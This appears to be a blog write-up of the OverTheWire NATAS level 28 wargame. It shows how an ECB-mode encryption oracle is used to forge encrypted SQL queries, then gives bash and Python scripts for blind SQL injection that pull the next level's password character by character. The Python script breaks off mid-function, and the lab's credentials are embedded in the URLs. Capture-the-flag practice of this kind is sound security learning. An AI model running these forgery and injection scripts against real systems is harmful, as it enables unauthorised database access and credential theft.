<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="OverTheWire: NATAS 28" /><meta property="og:locale" content="en" /><meta name="description" content="LEVEL 28" /><meta property="og:description" content="LEVEL 28" /><link rel="canonical" href="https://megawattsec.com/posts/overthewire-natas-28/" /><meta property="og:url" content="https://megawattsec.com/posts/overthewire-natas-28/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-26T10:04:43-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="OverTheWire: NATAS 28" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-09-26T10:04:43-04:00","datePublished":"2019-09-26T10:04:43-04:00","description":"LEVEL 28","headline":"OverTheWire: NATAS 28","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/overthewire-natas-28/"},"url":"https://megawattsec.com/posts/overthewire-natas-28/"}</script><title>OverTheWire: NATAS 28 | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>OverTheWire: NATAS 28</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>OverTheWire: NATAS 28</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1569506683" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-09-26 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2176 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h3 id="level-28"><span class="mr-2">LEVEL 28</span><a href="#level-28" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-307" data-src="/assets/img/2019/09/2019-09-23_12h53_15.png" data-proofer-ignore></p><p>No sourcecode, this will be fun. The program takes your query and searches it against a list of jokes, possibly in a database (since it says “whack computer joke database”).</p><p>Checking out the requests in Burp shows that my test query “the” is sent to the server and the response returns our query encoded, likely base64. This encoded query is then used in a redirect to “/search.php”.<br /> <img class="alignnone wp-image-309 size-full" data-src="/assets/img/2019/09/2019-09-23_14h15_11.png" data-proofer-ignore></p><p>It’s the “search.php” page that actually returns the results.<br /> <img class="alignnone wp-image-308 size-full" data-src="/assets/img/2019/09/2019-09-23_12h57_11.png" data-proofer-ignore></p><p>The output of base64 decoding isn’t quite what I expected though, it looks random enough to be an encryption. Surely it’s either a homegrown encryption, or one that has known exploitable weaknesses.</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~/otw/natas# echo "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKadzhfycqCxCf6AebHJxzOmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D" | urldecode | base64 -d | xxd
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 9a77 385f c9ca 82c4 27fa 01e6 c727 1cce  .w8_....'....'..
00000030: 9a2e 2b5d b6f3 1f19 a14f 7567 8ead aa90  ..+].....Oug....
00000040: 4249 b93e 4dea 0909 4799 95b9 c44b 351a  BI.&amp;gt;M...G....K5.
root@kali:~/otw/natas#</code></pre></figure><p>Was thinking that maybe we don’t need to break the encryption to get some meaningful results. Since there’s the hint that we’re querying a database, we can give it SQL injection statements and see what returns. However, none of the attempts I made had any difference, even what should have worked for a totally blind injection. So the input is probably escaped the way it should be.</p><h3 id="cryptanalysis"><span class="mr-2">Cryptanalysis</span><a href="#cryptanalysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Given the hint that it’s a database lookup, maybe the rest of the database query is in our input too. If the entire SQL query is being sent here, we won’t need an injection flaw, we would have complete control of the database after breaking the encryption.</p><p>I don’t know much about formal cryptanalysis, but I do know one of the fundamental techniques used is something called a known plaintext attack. Where the analyst knows or controls part of the original text, or plaintext, and can make inferences based upon how the ciphertext changes. We know that the word “the” is in the plaintext. And if there’s an entire SQL query, we know the “SELECT” operator must be in there.</p><p>To make analyzing so much easier, I made a bash script to help fetch the query strings instead of using Burp all the time and copying the data needed. It also uses another helper (python) script I wrote called “urldecode”, but it’s to find a solution for that.</p><figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c">#!/bin/bash</span>
<span class="c">#Helper script with Natas28 challenge</span>

<span class="c"># Get the input as an argument or STDIN</span>
<span class="o">[</span> <span class="nv">$# </span><span class="nt">-ge</span> 1 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">input</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">read </span>input

<span class="nv">resp1</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="nt">-X</span> POST<span class="se">\</span>
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.over&amp;gt<span class="p">;</span>
    <span class="nt">-H</span> <span class="s2">"User-Agent: curl"</span> <span class="se">\</span>
    <span class="nt">-d</span> <span class="s2">"query=</span><span class="nv">$input</span><span class="s2">"</span>
<span class="si">)</span>

<span class="nv">query</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$resp1</span><span class="s2">"</span> | <span class="nb">grep </span>Location | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'query='</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$query</span><span class="s2">"</span>

<span class="nv">query2</span><span class="o">=</span><span class="si">$(</span>urldecode <span class="s2">"</span><span class="nv">$query</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd<span class="si">)</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$query2</span><span class="s2">"</span></code></pre></figure><p>It just takes the first string given and returns the encoded query string and hex output. After trying different inputs with the helper script it becomes pretty clear there is a header in the response that never changes. The “SELECT” operator is probably within that unchanging header.</p><p>Testing various lengths of successive input strings, adding a new character to the end each succession. Like “0123”, then “01234”.</p><ul><li>The ciphertext is in blocks of 16 bytes<li>The first 2 blocks are unchanging<li>The third block is different for successive inputs until it is 11 characters long<li>The fourth block is different for successive inputs until it is 26 characters long<li>The fifth block is different for successive inputs until it is 42 characters long</ul><p>That output shows the encryption is in 16 byte blocks, and it is using Electronic Code Book mode. That should mean known plaintext attacks will be useful.</p><p>Long repetitive input strings demonstrate the ECB mode predictability that we can exploit.</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~/otw/natas# natas28 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1055  100   944  100   111    414     48  0:00:02  0:00:02 --:--:--   462
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJphx7FMRJp2Tgb25GgIYHAlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVCUSubjGwYIb8CEwbSf3U1QlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVAk6VfgG4VNzTDZVOyqkwhmoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 6987 1ec5 3112 69d9 381b db91 a021 81c0  i...1.i.8....!..
00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000050: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000060: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000070: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000080: 24e9 57e0 1b85 4dcd 30d9 54ec aa93 0866  $.W...M.0.T....f
00000090: a095 22f3 01cf 9d36 ac70 23f1 6594 8c5a  .."....6.p#.e..Z
000000a0: 9739 cd90 522f a7a8 6f95 773b 56f9 f8c0  .9..R/..o.w;V...</code></pre></figure><p>Since the goal is to send our own crafted SQL statement that’s encrypted with this system, we don’t have to figure out the encryption itself, we can simply use it as an oracle that gives us exactly what we want…</p><p>What that means is we send our SQL as the input string we want to encrypt in such a way that it is put into the output starting at offset 30h (0x00000030). Then extract those bytes and that’s the encrypted version of our SQL statement, and we can post it to “search.php”.</p><p>From the earlier observations taken of input lengths, we can deduce that our target 0x30 block begins with the 11th input character. In other words, the first ten characters sent to the oracle don’t matter. But we need to make sure our input stays within our known window where the blocks are predictable, so we can cleanly extract what we want. One way to do that would be to fill in the remainder of the last block with dummy chars.</p><p>Like this… suppose the input is “000000000011111111111111111111111111111111”, which is made by the command <code class="language-plaintext highlighter-rouge">python -c “print(‘0’10 + ‘1’16*2)”</code>. This gives us the first 10 useless chars as “0” and 32 payload chars as “1”, which results in 2 useful oracle blocks:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~# natas28 000000000011111111111111111111111111111111
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   992  100   944  100    48    410     20  0:00:02  0:00:02 --:--:--   431
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK9k3v%2Boj9xyHjD7FjiGWNblErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVBzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: bd93 7bfe a23f 71c8 78c3 ec58 e219 635b  ..{..?q.x..X..c[
00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.</code></pre></figure><p>Here’s a visualization of a SQL statement we could send and its relation to the oracle window (the “+” being a space in URL encoding):</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">000000000011111111111111111111111111111111
..........SELECT+*+FROM+jokes+++++++++++++</code></pre></figure><p>This is what we have back:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~/otw/natas# echo "..........SELECT * FROM jokes             " | urlencode | natas28
Sending: ..........SELECT%20%2A%20FROM%20jokes%20%20%20%20%20%20%20%20%20%20%20%20%20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   944  100    82    412     35  0:00:02  0:00:02 --:--:--   448
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjHs53rpC0ckH975k1JsPIfZzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe  ...G&amp;lt;..H..OP-.&amp;.
00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c  ....h.A.].\_....
00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6  {9..B.....d...!.
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.</code></pre></figure><p>And our oracle window:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c ....h.A.].\_....
00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6 {9..B.....d...!.</code></pre></figure><p>The final result is a bytestring of “de5b990ac1d04c6547da89610dc8680f39a7ae9df9901b5e334a484231dc3482”. To use this, it must be encoded back into a base64 string to send to “/search.php”. Use <code class="language-plaintext highlighter-rouge">echo “eaf50dd768f1418c5dde5c5fd3d3c08c7b39deba42d1c907f7be64d49b0f21f6” | xxd -r -p | base64</code></p><p>However, when trying to send the new query, it gives an error, “Incorrect amount of PKCS#7 padding for blocksize”.</p><p>Let’s see. PKCS #7 is described in RFC 5652 (Cryptographic Message Syntax).</p><p>The padding scheme itself is given in section <a href="http://tools.ietf.org/html/rfc5652#section-6.3" rel="noreferrer">6.3. Content-encryption Process</a>. It essentially says: append that many bytes as needed to fill the given block size (but at least one), and each of them should have the padding length as value.</p><p>Thus, looking at the last decrypted byte we know how many bytes to strip off. (One could also check that they all have the same value.)</p><p>This basically means we are sending the wrong length, since we don’t want any cryptographic padding.</p><p>To fix this, we need to send the last part of the original encrypted query instead of just the middle window part. To make it work with the SQL we want to execute, add a comment character on the end to ignore whatever else may be in the encrypted part.</p><p>The corrected data should look like this:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~/otw/natas# python -c "print('.'*10 + 'SELECT * FROM jokes #' + ' '*11)" | urlencode | natas28
Sending: ..........SELECT%20%2A%20FROM%20jokes%20%23%20%20%20%20%20%20%20%20%20%20%20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   944  100    82    412     35  0:00:02  0:00:02 --:--:--   447
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjAmOGYfT%2FZBosXI1SRye%2FjRzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe  ...G&amp;lt;..H..OP-.&amp;.
00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c  ....h.A.].\_....
00000040: 098e 1987 d3fd 9068 b172 3549 1c9e fe34  .......h.r5I...4
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.
root@kali:~/otw/natas# echo "eaf50dd768f1418c5dde5c5fd3d3c08c098e1987d3fd9068b17235491c9efe34738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702" | xxd -r -p | base64
6vUN12jxQYxd3lxf09PAjAmOGYfT/ZBosXI1SRye/jRzil/7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg==</code></pre></figure><p>And the result in Burp:<br /> <img class="alignnone wp-image-311 size-full" data-src="/assets/img/2019/09/2019-09-25_09h38_19.png" data-proofer-ignore></p><p>Awesome! We have jokes!</p><h3 id="sql"><span class="mr-2">SQL</span><a href="#sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Now that we can query the joke database with our own SQL code, the next objective is to extract the password for natas29.</p><p>To help with this objective, I modified the helper script to be more helpful:</p><figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c">#!/bin/bash</span>
<span class="c">#Helper script with Natas28 challenge</span>

<span class="c"># Get the input as an argument or STDIN</span>
<span class="o">[</span> <span class="nv">$# </span><span class="nt">-ge</span> 1 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">input</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">read </span>input

<span class="nv">strlength</span><span class="o">=</span><span class="sb">`</span><span class="nb">printf</span> <span class="s2">"%s"</span> <span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span> | <span class="nb">wc</span> <span class="nt">-c</span><span class="sb">`</span> 
<span class="nv">remainder</span><span class="o">=</span><span class="k">$((</span> <span class="m">16</span> <span class="o">-</span> <span class="nv">$strlength</span> <span class="o">%</span> <span class="m">16</span> <span class="k">))</span> 

<span class="nv">payload</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s2">"%0.s "</span> <span class="o">{</span>1..10<span class="o">}</span><span class="si">)</span> 
payload+<span class="o">=</span><span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span>
payload+<span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s2">"%0.s "</span> <span class="si">$(</span><span class="nb">seq</span> <span class="nv">$remainder</span><span class="si">))</span>
<span class="nv">payload2</span><span class="o">=</span><span class="si">$(</span>urlencode <span class="s2">"</span><span class="nv">$payload</span><span class="s2">"</span><span class="si">)</span>

<span class="nb">echo</span> <span class="s2">"Sending: </span><span class="nv">$payload2</span><span class="s2">"</span>
<span class="nv">resp1</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="se">\</span>
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/index.php <span class="se">\</span>
    <span class="nt">-H</span> <span class="s2">"User-Agent: curl"</span> <span class="se">\</span>
    <span class="nt">-d</span> <span class="s2">"query=</span><span class="nv">$payload2</span><span class="s2">"</span>
<span class="si">)</span>

<span class="nv">query</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$resp1</span><span class="s2">"</span> | <span class="nb">grep </span>Location | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'query='</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$query</span><span class="s2">"</span>

<span class="c"># URLdecode, base64 decode, print result from position 49 skipping the header, encode back into base64 </span>
<span class="nv">query2</span><span class="o">=</span><span class="si">$(</span>urldecode <span class="s2">"</span><span class="nv">$query</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tail</span> <span class="nt">-c</span> +49 | <span class="nb">base64</span> <span class="nt">-w0</span><span class="si">)</span> 
<span class="nb">echo</span> <span class="s2">"Encrypted Query: </span><span class="nv">$query2</span><span class="s2">"</span>

<span class="nv">output</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="se">\</span>
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php <span class="se">\</span>
    <span class="nt">-H</span> <span class="s2">"User-Agent: curl"</span> <span class="se">\</span>
    <span class="nt">-d</span> <span class="s2">"query=</span><span class="nv">$query2</span><span class="s2">"</span> <span class="si">)</span>

<span class="nb">echo</span> <span class="s2">"Result: </span><span class="nv">$output</span><span class="s2">"</span></code></pre></figure><p>The script takes the SQL query we want and returns the output from “search.php”. No intermediary steps needed =).</p><p>I then experimented with SQL commands to figure out a way to extract the password, and settled on using <code class="language-plaintext highlighter-rouge">‘select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #’ % (i, ord(c))</code>in a loop. That will test each character one at a time and if we guess it right, then jokes will be sent back in the response, otherwise no joke.</p><p>There’s just no way you’re going to want to do this manually, so here’s my python script for it:</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3.7
#
# main execution script for solving natas28 on OverTheWire.org
</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">urllib</span> <span class="k">as</span> <span class="n">ul</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># All possible characters
</span><span class="n">allChars</span> <span class="o">=</span> <span class="s">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
<span class="c1"># Final Password
</span><span class="n">password</span> <span class="o">=</span> <span class="s">''</span>
<span class="c1"># Our target URL
</span><span class="n">target</span> <span class="o">=</span> <span class="s">"http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101'</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">ul</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">urldecode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">ul</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">send_query</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
  <span class="n">blocksize</span> <span class="o">=</span> <span class="mi">16</span>
  <span class="n">remainder</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="o">%</span> <span class="n">blocksize</span>

  <span class="c1"># format query string with correct amount of characters
</span>  <span class="n">f_query</span> <span class="o">=</span> <span class="s">'.'</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="n">blocksize</span> <span class="o">-</span> <span class="n">remainder</span><span class="p">)</span>

  <span class="c1"># print query for reference
</span>  <span class="k">print</span><span class="p">(</span><span class="s">'{'</span> <span class="o">+</span> <span class="n">f_query</span> <span class="o">+</span> <span class="s">'}'</span><span class="p">)</span>

  <span class="c1"># send query to site for encryption
</span>  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'query'</span><span class="p">:</span> <span class="n">f_query</span><span class="p">}</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/index.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
  <span class="c1"># print(r.headers)
</span>
  <span class="c1"># format the response to only keep our modified query
</span>  <span class="n">mod_r</span> <span class="o">=</span> <span class="n">urldecode</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Location'</span><span class="p">])</span>
  <span class="n">mod_r</span> <span class="o">=</span> <span class="n">mod_r</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'query='</span><span class="p">)</span>
  <span class="n">bin_data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">a2b_base64</span><span class="p">(</span><span class="n">mod_r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'==='</span><span class="p">)</span>
  <span class="n">bin_data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">bin_data</span><span class="p">)</span>
  <span class="n">bin_data</span> <span class="o">=</span> <span class="n">bin_data</span><span class="p">[</span><span class="mi">96</span><span class="p">:]</span>
  <span class="n">bin_data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">bin_data</span><span class="p">)</span>
  <span class="n">bin_data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">b2a_base64</span><span class="p">(</span><span class="n">bin_data</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Binary Data String: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">bin_data</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">))</span>

  <span class="c1"># send the modified query to the search site
</span>  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'query'</span><span class="p">:</span> <span class="n">bin_data</span><span class="p">}</span>
